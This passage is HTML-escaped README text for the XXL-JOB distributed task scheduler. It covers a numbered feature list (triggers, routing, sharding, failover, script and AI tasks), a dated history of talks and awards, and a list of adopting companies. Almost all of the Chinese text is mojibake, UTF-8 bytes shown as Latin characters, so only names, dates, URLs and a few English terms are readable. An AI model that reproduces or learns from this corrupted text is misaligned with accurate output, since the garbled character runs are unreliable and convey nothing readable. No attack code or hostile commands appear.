 &lt;li&gt;7ã€�è§¦å�‘ç­–ç•¥ï¼šæ��ä¾›ä¸°å¯Œçš„ä»»åŠ¡è§¦å�‘ç­–ç•¥ï¼ŒåŒ…æ‹¬ï¼šCronè§¦å�‘ã€�å›ºå®šé—´éš”è§¦å�‘ã€�å›ºå®šå»¶æ—¶è§¦å�‘ã€�APIï¼ˆäº‹ä»¶ï¼‰è§¦å�‘ã€�äººå·¥è§¦å�‘ã€�çˆ¶å­�ä»»åŠ¡è§¦å�‘ï¼›&lt;/li&gt; 
 &lt;li&gt;8ã€�è°ƒåº¦è¿‡æœŸç­–ç•¥ï¼šè°ƒåº¦ä¸­å¿ƒé”™è¿‡è°ƒåº¦æ—¶é—´çš„è¡¥å�¿å¤„ç�†ç­–ç•¥ï¼ŒåŒ…æ‹¬ï¼šå¿½ç•¥ã€�ç«‹å�³è¡¥å�¿è§¦å�‘ä¸€æ¬¡ç­‰ï¼›&lt;/li&gt; 
 &lt;li&gt;9ã€�é˜»å¡�å¤„ç�†ç­–ç•¥ï¼šè°ƒåº¦è¿‡äº�å¯†é›†æ‰§è¡Œå™¨æ�¥ä¸�å�Šå¤„ç�†æ—¶çš„å¤„ç�†ç­–ç•¥ï¼Œç­–ç•¥åŒ…æ‹¬ï¼šå�•æœºä¸²è¡Œï¼ˆé»˜è®¤ï¼‰ã€�ä¸¢å¼ƒå��ç»­è°ƒåº¦ã€�è¦†ç›–ä¹‹å‰�è°ƒåº¦ï¼›&lt;/li&gt; 
 &lt;li&gt;10ã€�ä»»åŠ¡è¶…æ—¶æ�§åˆ¶ï¼šæ”¯æŒ�è‡ªå®šä¹‰ä»»åŠ¡è¶…æ—¶æ—¶é—´ï¼Œä»»åŠ¡è¿�è¡Œè¶…æ—¶å°†ä¼šä¸»åŠ¨ä¸­æ–­ä»»åŠ¡ï¼›&lt;/li&gt; 
 &lt;li&gt;11ã€�ä»»åŠ¡å¤±è´¥é‡�è¯•ï¼šæ”¯æŒ�è‡ªå®šä¹‰ä»»åŠ¡å¤±è´¥é‡�è¯•æ¬¡æ•°ï¼Œå½“ä»»åŠ¡å¤±è´¥æ—¶å°†ä¼šæŒ‰ç…§é¢„è®¾çš„å¤±è´¥é‡�è¯•æ¬¡æ•°ä¸»åŠ¨è¿›è¡Œé‡�è¯•ï¼›å…¶ä¸­åˆ†ç‰‡ä»»åŠ¡æ”¯æŒ�åˆ†ç‰‡ç²’åº¦çš„å¤±è´¥é‡�è¯•ï¼›&lt;/li&gt; 
 &lt;li&gt;12ã€�ä»»åŠ¡å¤±è´¥å‘Šè­¦ï¼›é»˜è®¤æ��ä¾›é‚®ä»¶æ–¹å¼�å¤±è´¥å‘Šè­¦ï¼Œå�Œæ—¶é¢„ç•™æ‰©å±•æ�¥å�£ï¼Œå�¯æ–¹ä¾¿çš„æ‰©å±•çŸ­ä¿¡ã€�é’‰é’‰ç­‰å‘Šè­¦æ–¹å¼�ï¼›&lt;/li&gt; 
 &lt;li&gt;13ã€�è·¯ç”±ç­–ç•¥ï¼šæ‰§è¡Œå™¨é›†ç¾¤éƒ¨ç½²æ—¶æ��ä¾›ä¸°å¯Œçš„è·¯ç”±ç­–ç•¥ï¼ŒåŒ…æ‹¬ï¼šç¬¬ä¸€ä¸ªã€�æœ€å��ä¸€ä¸ªã€�è½®è¯¢ã€�éš�æœºã€�ä¸€è‡´æ€§HASHã€�æœ€ä¸�ç»�å¸¸ä½¿ç”¨ã€�æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ã€�æ•…éšœè½¬ç§»ã€�å¿™ç¢Œè½¬ç§»ç­‰ï¼›&lt;/li&gt; 
 &lt;li&gt;14ã€�åˆ†ç‰‡å¹¿æ’­ä»»åŠ¡ï¼šæ‰§è¡Œå™¨é›†ç¾¤éƒ¨ç½²æ—¶ï¼Œä»»åŠ¡è·¯ç”±ç­–ç•¥é€‰æ‹©"åˆ†ç‰‡å¹¿æ’­"æƒ…å†µä¸‹ï¼Œä¸€æ¬¡ä»»åŠ¡è°ƒåº¦å°†ä¼šå¹¿æ’­è§¦å�‘é›†ç¾¤ä¸­æ‰€æœ‰æ‰§è¡Œå™¨æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ï¼Œå�¯æ ¹æ�®åˆ†ç‰‡å�‚æ•°å¼€å�‘åˆ†ç‰‡ä»»åŠ¡ï¼›&lt;/li&gt; 
 &lt;li&gt;15ã€�åŠ¨æ€�åˆ†ç‰‡ï¼šåˆ†ç‰‡å¹¿æ’­ä»»åŠ¡ä»¥æ‰§è¡Œå™¨ä¸ºç»´åº¦è¿›è¡Œåˆ†ç‰‡ï¼Œæ”¯æŒ�åŠ¨æ€�æ‰©å®¹æ‰§è¡Œå™¨é›†ç¾¤ä»�è€ŒåŠ¨æ€�å¢�åŠ åˆ†ç‰‡æ•°é‡�ï¼Œå��å�Œè¿›è¡Œä¸šåŠ¡å¤„ç�†ï¼›åœ¨è¿›è¡Œå¤§æ•°æ�®é‡�ä¸šåŠ¡æ“�ä½œæ—¶å�¯æ˜¾è‘—æ��å�‡ä»»åŠ¡å¤„ç�†èƒ½åŠ›å’Œé€Ÿåº¦ã€‚&lt;/li&gt; 
 &lt;li&gt;16ã€�æ•…éšœè½¬ç§»ï¼šä»»åŠ¡è·¯ç”±ç­–ç•¥é€‰æ‹©"æ•…éšœè½¬ç§»"æƒ…å†µä¸‹ï¼Œå¦‚æ�œæ‰§è¡Œå™¨é›†ç¾¤ä¸­æŸ�ä¸€å�°æœºå™¨æ•…éšœï¼Œå°†ä¼šè‡ªåŠ¨Failoveråˆ‡æ�¢åˆ°ä¸€å�°æ­£å¸¸çš„æ‰§è¡Œå™¨å�‘é€�è°ƒåº¦è¯·æ±‚ã€‚&lt;/li&gt; 
 &lt;li&gt;17ã€�ä»»åŠ¡è¿›åº¦ç›‘æ�§ï¼šæ”¯æŒ�å®�æ—¶ç›‘æ�§ä»»åŠ¡è¿›åº¦ï¼›&lt;/li&gt; 
 &lt;li&gt;18ã€�Rollingå®�æ—¶æ—¥å¿—ï¼šæ”¯æŒ�åœ¨çº¿æŸ¥çœ‹è°ƒåº¦ç»“æ�œï¼Œå¹¶ä¸”æ”¯æŒ�ä»¥Rollingæ–¹å¼�å®�æ—¶æŸ¥çœ‹æ‰§è¡Œå™¨è¾“å‡ºçš„å®Œæ•´çš„æ‰§è¡Œæ—¥å¿—ï¼›&lt;/li&gt; 
 &lt;li&gt;19ã€�GLUEï¼šæ��ä¾›Web IDEï¼Œæ”¯æŒ�åœ¨çº¿å¼€å�‘ä»»åŠ¡é€»è¾‘ä»£ç �ï¼ŒåŠ¨æ€�å�‘å¸ƒï¼Œå®�æ—¶ç¼–è¯‘ç”Ÿæ•ˆï¼Œçœ�ç•¥éƒ¨ç½²ä¸Šçº¿çš„è¿‡ç¨‹ã€‚æ”¯æŒ�30ä¸ªç‰ˆæœ¬çš„å�†å�²ç‰ˆæœ¬å›�æº¯ã€‚&lt;/li&gt; 
 &lt;li&gt;20ã€�è„šæœ¬ä»»åŠ¡ï¼šæ”¯æŒ�ä»¥GLUEæ¨¡å¼�å¼€å�‘å’Œè¿�è¡Œè„šæœ¬ä»»åŠ¡ï¼ŒåŒ…æ‹¬Shellã€�Pythonã€�NodeJSã€�PHPã€�PowerShellç­‰ç±»å�‹è„šæœ¬;&lt;/li&gt; 
 &lt;li&gt;21ã€�å‘½ä»¤è¡Œä»»åŠ¡ï¼šå�Ÿç”Ÿæ��ä¾›é€šç”¨å‘½ä»¤è¡Œä»»åŠ¡Handlerï¼ˆBeanä»»åŠ¡ï¼Œ"CommandJobHandler"ï¼‰ï¼›ä¸šåŠ¡æ–¹å�ªéœ€è¦�æ��ä¾›å‘½ä»¤è¡Œå�³å�¯ï¼›&lt;/li&gt; 
 &lt;li&gt;22ã€�ä»»åŠ¡ä¾�èµ–ï¼šæ”¯æŒ�é…�ç½®å­�ä»»åŠ¡ä¾�èµ–ï¼Œå½“çˆ¶ä»»åŠ¡æ‰§è¡Œç»“æ�Ÿä¸”æ‰§è¡Œæˆ�åŠŸå��å°†ä¼šä¸»åŠ¨è§¦å�‘ä¸€æ¬¡å­�ä»»åŠ¡çš„æ‰§è¡Œ, å¤šä¸ªå­�ä»»åŠ¡ç”¨é€—å�·åˆ†éš”ï¼›&lt;/li&gt; 
 &lt;li&gt;23ã€�ä¸€è‡´æ€§ï¼šâ€œè°ƒåº¦ä¸­å¿ƒâ€�é€šè¿‡DBé”�ä¿�è¯�é›†ç¾¤åˆ†å¸ƒå¼�è°ƒåº¦çš„ä¸€è‡´æ€§, ä¸€æ¬¡ä»»åŠ¡è°ƒåº¦å�ªä¼šè§¦å�‘ä¸€æ¬¡æ‰§è¡Œï¼›&lt;/li&gt; 
 &lt;li&gt;24ã€�è‡ªå®šä¹‰ä»»åŠ¡å�‚æ•°ï¼šæ”¯æŒ�åœ¨çº¿é…�ç½®è°ƒåº¦ä»»åŠ¡å…¥å�‚ï¼Œå�³æ—¶ç”Ÿæ•ˆï¼›&lt;/li&gt; 
 &lt;li&gt;25ã€�è°ƒåº¦çº¿ç¨‹æ± ï¼šè°ƒåº¦ç³»ç»Ÿå¤šçº¿ç¨‹è§¦å�‘è°ƒåº¦è¿�è¡Œï¼Œç¡®ä¿�è°ƒåº¦ç²¾ç¡®æ‰§è¡Œï¼Œä¸�è¢«å µå¡�ï¼›&lt;/li&gt; 
 &lt;li&gt;26ã€�æ•°æ�®åŠ å¯†ï¼šè°ƒåº¦ä¸­å¿ƒå’Œæ‰§è¡Œå™¨ä¹‹é—´çš„é€šè®¯è¿›è¡Œæ•°æ�®åŠ å¯†ï¼Œæ��å�‡è°ƒåº¦ä¿¡æ�¯å®‰å…¨æ€§ï¼›&lt;/li&gt; 
 &lt;li&gt;27ã€�é‚®ä»¶æŠ¥è­¦ï¼šä»»åŠ¡å¤±è´¥æ—¶æ”¯æŒ�é‚®ä»¶æŠ¥è­¦ï¼Œæ”¯æŒ�é…�ç½®å¤šé‚®ä»¶åœ°å�€ç¾¤å�‘æŠ¥è­¦é‚®ä»¶ï¼›&lt;/li&gt; 
 &lt;li&gt;28ã€�æ�¨é€�mavenä¸­å¤®ä»“åº“: å°†ä¼šæŠŠæœ€æ–°ç¨³å®šç‰ˆæ�¨é€�åˆ°mavenä¸­å¤®ä»“åº“, æ–¹ä¾¿ç”¨æˆ·æ�¥å…¥å’Œä½¿ç”¨;&lt;/li&gt; 
 &lt;li&gt;29ã€�è¿�è¡ŒæŠ¥è¡¨ï¼šæ”¯æŒ�å®�æ—¶æŸ¥çœ‹è¿�è¡Œæ•°æ�®ï¼Œå¦‚ä»»åŠ¡æ•°é‡�ã€�è°ƒåº¦æ¬¡æ•°ã€�æ‰§è¡Œå™¨æ•°é‡�ç­‰ï¼›ä»¥å�Šè°ƒåº¦æŠ¥è¡¨ï¼Œå¦‚è°ƒåº¦æ—¥æœŸåˆ†å¸ƒå›¾ï¼Œè°ƒåº¦æˆ�åŠŸåˆ†å¸ƒå›¾ç­‰ï¼›&lt;/li&gt; 
 &lt;li&gt;30ã€�å…¨å¼‚æ­¥ï¼šä»»åŠ¡è°ƒåº¦æµ�ç¨‹å…¨å¼‚æ­¥åŒ–è®¾è®¡å®�ç�°ï¼Œå¦‚å¼‚æ­¥è°ƒåº¦ã€�å¼‚æ­¥è¿�è¡Œã€�å¼‚æ­¥å›�è°ƒç­‰ï¼Œæœ‰æ•ˆå¯¹å¯†é›†è°ƒåº¦è¿›è¡Œæµ�é‡�å‰Šå³°ï¼Œç�†è®ºä¸Šæ”¯æŒ�ä»»æ„�æ—¶é•¿ä»»åŠ¡çš„è¿�è¡Œï¼›&lt;/li&gt; 
 &lt;li&gt;31ã€�è·¨è¯­è¨€/OpenAPIï¼šè°ƒåº¦ä¸­å¿ƒä¸�æ‰§è¡Œå™¨æ��ä¾›è¯­è¨€æ— å…³çš„ OpenApiï¼ˆRESTful æ ¼å¼�ï¼‰ï¼Œç¬¬ä¸‰æ–¹ä»»æ„�è¯­è¨€å�¯æ�®æ­¤å¯¹æ�¥è°ƒåº¦ä¸­å¿ƒæˆ–è€…å®�ç�°æ‰§è¡Œå™¨ï¼Œå®�ç�°å¤šè¯­è¨€æ”¯æŒ�ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æ��ä¾›äº† â€œå¤šä»»åŠ¡æ¨¡å¼�â€�å’Œâ€œhttpJobHandlerâ€�ç­‰å…¶ä»–è·¨è¯­è¨€æ–¹æ¡ˆï¼›&lt;/li&gt; 
 &lt;li&gt;32ã€�å›½é™…åŒ–ï¼šè°ƒåº¦ä¸­å¿ƒæ”¯æŒ�å›½é™…åŒ–è®¾ç½®ï¼Œæ��ä¾›ä¸­æ–‡ã€�è‹±æ–‡ä¸¤ç§�å�¯é€‰è¯­è¨€ï¼Œé»˜è®¤ä¸ºä¸­æ–‡ï¼›&lt;/li&gt; 
 &lt;li&gt;33ã€�å®¹å™¨åŒ–ï¼šæ��ä¾›å®˜æ–¹dockeré•œåƒ�ï¼Œå¹¶å®�æ—¶æ›´æ–°æ�¨é€�dockerhubï¼Œè¿›ä¸€æ­¥å®�ç�°äº§å“�å¼€ç®±å�³ç”¨ï¼›&lt;/li&gt; 
 &lt;li&gt;34ã€�çº¿ç¨‹æ± éš”ç¦»ï¼šè°ƒåº¦çº¿ç¨‹æ± è¿›è¡Œéš”ç¦»æ‹†åˆ†ï¼Œæ…¢ä»»åŠ¡è‡ªåŠ¨é™�çº§è¿›å…¥"Slow"çº¿ç¨‹æ± ï¼Œé�¿å…�è€—å°½è°ƒåº¦çº¿ç¨‹ï¼Œæ��é«˜ç³»ç»Ÿç¨³å®šæ€§ï¼›&lt;/li&gt; 
 &lt;li&gt;35ã€�ç”¨æˆ·ç®¡ç�†ï¼šæ”¯æŒ�åœ¨çº¿ç®¡ç�†ç³»ç»Ÿç”¨æˆ·ï¼Œå­˜åœ¨ç®¡ç�†å‘˜ã€�æ™®é€šç”¨æˆ·ä¸¤ç§�è§’è‰²ï¼›&lt;/li&gt; 
 &lt;li&gt;36ã€�æ�ƒé™�æ�§åˆ¶ï¼šæ‰§è¡Œå™¨ç»´åº¦è¿›è¡Œæ�ƒé™�æ�§åˆ¶ï¼Œç®¡ç�†å‘˜æ‹¥æœ‰å…¨é‡�æ�ƒé™�ï¼Œæ™®é€šç”¨æˆ·éœ€è¦�åˆ†é…�æ‰§è¡Œå™¨æ�ƒé™�å��æ‰�å…�è®¸ç›¸å…³æ“�ä½œï¼›&lt;/li&gt; 
 &lt;li&gt;37ã€�AIä»»åŠ¡ï¼šå�Ÿç”Ÿæ��ä¾›AIæ‰§è¡Œå™¨ï¼Œå¹¶å†…ç½®å¤šä¸ªAIä»»åŠ¡Handlerï¼Œä¸�spring-aiã€�ollamaã€�difyç­‰é›†æˆ�æ‰“é€šï¼Œæ”¯æŒ�å¿«é€Ÿå¼€å�‘AIç±»ä»»åŠ¡ã€‚&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Development&lt;/h2&gt; 
&lt;p&gt;äº�2015å¹´ä¸­ï¼Œæˆ‘åœ¨githubä¸Šåˆ›å»ºXXL-JOBé¡¹ç›®ä»“åº“å¹¶æ��äº¤ç¬¬ä¸€ä¸ªcommitï¼Œéš�ä¹‹è¿›è¡Œç³»ç»Ÿç»“æ�„è®¾è®¡ï¼ŒUIé€‰å�‹ï¼Œäº¤äº’è®¾è®¡â€¦â€¦&lt;/p&gt; 
&lt;p&gt;äº�2015-11æœˆï¼ŒXXL-JOBç»ˆäº�RELEASEäº†ç¬¬ä¸€ä¸ªå¤§ç‰ˆæœ¬V1.0ï¼Œ éš�å��æˆ‘å°†ä¹‹å�‘å¸ƒåˆ°OSCHINAï¼ŒXXL-JOBåœ¨OSCHINAä¸Šè�·å¾—äº†@çº¢è–¯çš„çƒ­é—¨æ�¨è��ï¼Œå�ŒæœŸåˆ†åˆ«è¾¾åˆ°äº†OSCHINAçš„â€œçƒ­é—¨åŠ¨å¼¹â€�æ�’è¡Œç¬¬ä¸€å’Œgit.oschinaçš„å¼€æº�è½¯ä»¶æœˆçƒ­åº¦æ�’è¡Œç¬¬ä¸€ï¼Œåœ¨æ­¤ç‰¹åˆ«æ„Ÿè°¢çº¢è–¯ï¼Œæ„Ÿè°¢å¤§å®¶çš„å…³æ³¨å’Œæ”¯æŒ�ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2015-12æœˆï¼Œæˆ‘å°†XXL-JOBå�‘è¡¨åˆ°æˆ‘å�¸å†…éƒ¨çŸ¥è¯†åº“ï¼Œå¹¶ä¸”å¾—åˆ°å†…éƒ¨å�Œäº‹è®¤å�¯ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2016-01æœˆï¼Œæˆ‘å�¸å±•å¼€XXL-JOBçš„å†…éƒ¨æ�¥å…¥å’Œå®šåˆ¶å·¥ä½œï¼Œåœ¨æ­¤æ„Ÿè°¢è¢�æŸ�å’Œå°¹æŸ�ä¸¤ä½�å�Œäº‹çš„è´¡çŒ®ï¼Œå�Œæ—¶ä¹Ÿæ„Ÿè°¢å†…éƒ¨å…¶ä»–ç»™ä¸�å…³æ³¨ä¸�æ”¯æŒ�çš„å�Œäº‹ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2017-05-13ï¼Œåœ¨ä¸Šæµ·ä¸¾åŠ�çš„ "&lt;a href="https://www.oschina.net/event/2236961"&gt;ç¬¬62æœŸå¼€æº�ä¸­å›½æº�åˆ›ä¼š&lt;/a&gt;" çš„ "æ”¾ç �è¿‡æ�¥" ç�¯èŠ‚ï¼Œæˆ‘ç™»å�°å¯¹XXL-JOBå�šäº†æ¼”è®²ï¼Œå�°ä¸‹äº”ç™¾ä½�åœ¨åœºè§‚ä¼—å��å“�çƒ­çƒˆï¼ˆ&lt;a href="https://www.oschina.net/question/2686220_2242120"&gt;å›¾æ–‡å›�é¡¾&lt;/a&gt; ï¼‰ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2017-10-22ï¼Œå�ˆæ‹�äº‘ Open Talk è�”å�ˆ Spring Cloud ä¸­å›½ç¤¾åŒºä¸¾åŠ�çš„ "&lt;a href="https://opentalk.upyun.com/303.html"&gt;è¿›å‡»çš„å¾®æœ�åŠ¡å®�æˆ˜æ´¾ä¸Šæµ·ç«™&lt;/a&gt;"ï¼Œæˆ‘ç™»å�°å¯¹XXL-JOBå�šäº†æ¼”è®²ï¼Œç�°åœºè§‚ä¼—å��å“�çƒ­çƒˆå¹¶åœ¨ä¼šå��ä¸�XXL-JOBç”¨æˆ·çƒ­çƒˆè®¨è®ºäº¤æµ�ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2017-12-11ï¼ŒXXL-JOBæœ‰å¹¸å�‚ä¼šã€Š&lt;a href="http://bj2017.archsummit.com/"&gt;InfoQ ArchSummitå…¨ç�ƒæ�¶æ�„å¸ˆå³°ä¼š&lt;/a&gt;ã€‹ï¼Œå¹¶è¢«æ‹�æ‹�è´·æ�¶æ�„æ€»ç›‘"æ�¨æ³¢è€�å¸ˆ"åœ¨ä¸“é¢˜ "&lt;a href="http://bj2017.archsummit.com/training/2"&gt;å¾®æœ�åŠ¡å�Ÿç�†ã€�åŸºç¡€æ�¶æ�„å’Œå¼€æº�å®�è·µ&lt;/a&gt;" ä¸­ç�°åœºä»‹ç»�ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2017-12-18ï¼ŒXXL-JOBå�‚ä¸�"&lt;a href="http://www.oschina.net/project/top_cn_2017?sort=1"&gt;2017å¹´åº¦æœ€å�—æ¬¢è¿�ä¸­å›½å¼€æº�è½¯ä»¶&lt;/a&gt;"è¯„æ¯”ï¼Œåœ¨å½“æ—¶å·²å½•å…¥çš„çº¦ä¹�å�ƒä¸ªå›½äº§å¼€æº�é¡¹ç›®ä¸­è§’é€�ï¼Œæœ€ç»ˆè¿›å…¥äº†å‰�30å¼ºã€‚&lt;/p&gt; 
&lt;p&gt;äº�2018-01-15ï¼ŒXXL-JOBå�‚ä¸�"&lt;a href="https://www.oschina.net/news/92438/2017-mayun-top-50"&gt;2017ç �äº‘æœ€ç�«å¼€æº�é¡¹ç›®&lt;/a&gt;"è¯„æ¯”ï¼Œåœ¨å½“æ—¶å·²å½•å…¥çš„çº¦å…­å�ƒäº”ç™¾ä¸ªç �äº‘é¡¹ç›®ä¸­è§’é€�ï¼Œæœ€ç»ˆè¿›å�»äº†å‰�20å¼ºã€‚&lt;/p&gt; 
&lt;p&gt;äº�2018-04-14ï¼ŒiTechPlusåœ¨ä¸Šæµ·ä¸¾åŠ�çš„ "&lt;a href="http://www.itdks.com/eventlist/detail/2065"&gt;2018äº’è�”ç½‘å¼€å�‘è€…å¤§ä¼š&lt;/a&gt;"ï¼Œæˆ‘ç™»å�°å¯¹XXL-JOBå�šäº†æ¼”è®²ï¼Œç�°åœºè§‚ä¼—å��å“�çƒ­çƒˆå¹¶åœ¨ä¼šå��ä¸�XXL-JOBç”¨æˆ·çƒ­çƒˆè®¨è®ºäº¤æµ�ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2018-05-27ï¼Œåœ¨ä¸Šæµ·ä¸¾åŠ�çš„ "&lt;a href="https://www.oschina.net/event/2278742"&gt;ç¬¬75æœŸå¼€æº�ä¸­å›½æº�åˆ›ä¼š&lt;/a&gt;" çš„ "æ�¶æ�„" ä¸»é¢˜ä¸“åœºï¼Œæˆ‘ç™»å�°è¿›è¡Œâ€œåŸºç¡€æ�¶æ�„ä¸�ä¸­é—´ä»¶å›¾è°±â€�ä¸»é¢˜æ¼”è®²ï¼Œå�°ä¸‹ä¸Šå�ƒä½�åœ¨åœºè§‚ä¼—å��å“�çƒ­çƒˆï¼ˆ&lt;a href="https://www.oschina.net/question/3802184_2280606"&gt;å›¾æ–‡å›�é¡¾&lt;/a&gt; ï¼‰ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2018-12-05ï¼ŒXXL-JOBå�‚ä¸�"&lt;a href="https://www.oschina.net/project/top_cn_2018?sort=1"&gt;2018å¹´åº¦æœ€å�—æ¬¢è¿�ä¸­å›½å¼€æº�è½¯ä»¶&lt;/a&gt;"è¯„æ¯”ï¼Œåœ¨å½“æ—¶å·²å½•å…¥çš„ä¸€ä¸‡å¤šä¸ªå¼€æº�é¡¹ç›®ä¸­è§’é€�ï¼Œæœ€ç»ˆæ�’å��ç¬¬19å��ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2019-12-10ï¼ŒXXL-JOBå�‚ä¸�"&lt;a href="https://www.oschina.net/project/top_cn_2019"&gt;2019å¹´åº¦æœ€å�—æ¬¢è¿�ä¸­å›½å¼€æº�è½¯ä»¶&lt;/a&gt;"è¯„æ¯”ï¼Œåœ¨å½“æ—¶å·²å½•å…¥çš„ä¸€ä¸‡å¤šä¸ªå¼€æº�é¡¹ç›®ä¸­è§’é€�ï¼Œæœ€ç»ˆæ�’å��"å¼€å�‘æ¡†æ�¶å’ŒåŸºç¡€ç»„ä»¶ç±»"ç¬¬9å��ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2020-11-16ï¼ŒXXL-JOBå�‚ä¸�"&lt;a href="https://www.oschina.net/project/top_cn_2020"&gt;2020å¹´åº¦æœ€å�—æ¬¢è¿�ä¸­å›½å¼€æº�è½¯ä»¶&lt;/a&gt;"è¯„æ¯”ï¼Œåœ¨å½“æ—¶å·²å½•å…¥çš„ä¸€ä¸‡å¤šä¸ªå¼€æº�é¡¹ç›®ä¸­è§’é€�ï¼Œæœ€ç»ˆæ�’å��"å¼€å�‘æ¡†æ�¶å’ŒåŸºç¡€ç»„ä»¶ç±»"ç¬¬8å��ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2021-12-06ï¼ŒXXL-JOBå�‚ä¸�"&lt;a href="https://www.oschina.net/project/top_cn_2021"&gt;2021å¹´åº¦OSCä¸­å›½å¼€æº�é¡¹ç›®è¯„é€‰&lt;/a&gt; "è¯„æ¯”ï¼Œåœ¨å½“æ—¶å·²å½•å…¥çš„ä¸€ä¸‡å¤šä¸ªå¼€æº�é¡¹ç›®ä¸­è§’é€�ï¼Œæœ€ç»ˆå½“é€‰"æœ€å�—æ¬¢è¿�é¡¹ç›®"ã€‚&lt;/p&gt; 
&lt;p&gt;äº�2024-11-06ï¼ŒXXL-JOBç»� GitCode å®˜æ–¹è¯„å®¡ï¼Œè�·å¾— â€œG-Staré¡¹ç›®æ¯•ä¸šè®¤è¯�â€�ã€‚&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;æˆ‘å�¸å¤§ä¼—ç‚¹è¯„ç›®å‰�å·²æ�¥å…¥XXL-JOBï¼Œå†…éƒ¨åˆ«å��ã€ŠFerrariã€‹ï¼ˆFerrariåŸºäº�XXL-JOBçš„V1.1ç‰ˆæœ¬å®šåˆ¶è€Œæˆ�ï¼Œæ–°æ�¥å…¥åº”ç”¨æ�¨è��å�‡çº§æœ€æ–°ç‰ˆæœ¬ï¼‰ã€‚ æ�®æœ€æ–°ç»Ÿè®¡, è‡ª2016-01-21æ�¥å…¥è‡³2017-12-01æœŸé—´ï¼Œè¯¥ç³»ç»Ÿå·²è°ƒåº¦çº¦100ä¸‡æ¬¡ï¼Œè¡¨ç�°ä¼˜å¼‚ã€‚æ–°æ�¥å…¥åº”ç”¨æ�¨è��ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ï¼Œå› ä¸ºç»�è¿‡æ•°å��ä¸ªç‰ˆæœ¬çš„æ›´æ–°ï¼Œç³»ç»Ÿçš„ä»»åŠ¡æ¨¡å�‹ã€�UIäº¤äº’æ¨¡å�‹ä»¥å�Šåº•å±‚è°ƒåº¦é€šè®¯æ¨¡å�‹éƒ½æœ‰äº†è¾ƒå¤§çš„ä¼˜åŒ–å’Œæ��å�‡ï¼Œæ ¸å¿ƒåŠŸèƒ½æ›´åŠ ç¨³å®šé«˜æ•ˆã€‚&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;è‡³ä»Šï¼ŒXXL-JOBå·²æ�¥å…¥å¤šå®¶å…¬å�¸çš„çº¿ä¸Šäº§å“�çº¿ï¼Œæ�¥å…¥åœºæ™¯å¦‚ç”µå•†ä¸šåŠ¡ï¼ŒO2Oä¸šåŠ¡å’Œå¤§æ•°æ�®ä½œä¸šç­‰ï¼Œæˆªæ­¢æœ€æ–°ç»Ÿè®¡æ—¶é—´ä¸ºæ­¢ï¼ŒXXL-JOBå·²æ�¥å…¥çš„å…¬å�¸åŒ…æ‹¬ä¸�é™�äº�ï¼š&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;- 1ã€�å¤§ä¼—ç‚¹è¯„ã€�ç¾�å›¢ç‚¹è¯„ã€‘
- 2ã€�å±±ä¸œå­¦è€Œç½‘ç»œç§‘æŠ€æœ‰é™�å…¬å�¸ï¼›
- 3ã€�å®‰å¾½æ…§é€šäº’è�”ç§‘æŠ€æœ‰é™�å…¬å�¸ï¼›
- 4ã€�äººäººè�šè´¢é‡‘æœ�ï¼›
- 5ã€�ä¸Šæµ·æ£ æ££ä¿¡æ�¯ç§‘æŠ€è‚¡ä»½æœ‰é™�å…¬å�¸
- 6ã€�è¿�æ»¡æ»¡ã€�è¿�æ»¡æ»¡ã€‘
- 7ã€�ç±³å…¶æ�— (ä¸­å›½åŒº)ã€�ç±³å…¶æ�—ã€‘
- 8ã€�å¦ˆå¦ˆè�”ç›Ÿ
- 9ã€�ä¹�æ¨±å¤©ä¸‹ï¼ˆåŒ—äº¬ï¼‰ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 10ã€�ä¸‡æ™®æ‹‰æ–¯ç§‘æŠ€æœ‰é™�å…¬å�¸ã€�ä¸€åŠ æ‰‹æœºã€‘
- 11ã€�ä¸Šæµ·äº¿ä¿�å�¥åº·ç®¡ç�†æœ‰é™�å…¬å�¸
- 12ã€�æµ·å°”é¦¨å�¨ã€�æµ·å°”ã€‘
- 13ã€�æ²³å�—å¤§çº¢åŒ…ç”µå­�å•†åŠ¡æœ‰é™�å…¬å�¸
- 14ã€�æˆ�éƒ½é¡ºç‚¹ç§‘æŠ€æœ‰é™�å…¬å�¸
- 15ã€�æ·±åœ³å¸‚æ€¡äºšé€š
- 16ã€�æ·±åœ³éº¦äºšä¿¡ç§‘æŠ€è‚¡ä»½æœ‰é™�å…¬å�¸
- 17ã€�ä¸Šæµ·å�šè�¹ç§‘æŠ€ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 18ã€�ä¸­å›½å¹³å®‰ç§‘æŠ€æœ‰é™�å…¬å�¸ã€�ä¸­å›½å¹³å®‰ã€‘
- 19ã€�æ�­å·�çŸ¥æ—¶ä¿¡æ�¯ç§‘æŠ€æœ‰é™�å…¬å�¸
- 20ã€�å�šè�¹ç§‘æŠ€ï¼ˆä¸Šæµ·ï¼‰æœ‰é™�å…¬å�¸
- 21ã€�æˆ�éƒ½ä¾�èƒ½è‚¡ä»½æœ‰é™�è´£ä»»å…¬å�¸
- 22ã€�æ¹–å�—é«˜é˜³é€šè�”ä¿¡æ�¯æŠ€æœ¯æœ‰é™�å…¬å�¸
- 23ã€�æ·±åœ³å¸‚é‚¦å¾·æ–‡åŒ–å�‘å±•æœ‰é™�å…¬å�¸
- 24ã€�ç¦�å»ºé˜¿æ€�å�¯ç½‘ç»œæ•™è‚²æœ‰é™�å…¬å�¸
- 25ã€�ä¼˜ä¿¡äºŒæ‰‹è½¦ã€�ä¼˜ä¿¡ã€‘
- 26ã€�ä¸Šæµ·æ‚ æ¸¸å ‚æŠ•èµ„å�‘å±•è‚¡ä»½æœ‰é™�å…¬å�¸ã€�æ‚ æ¸¸å ‚ã€‘
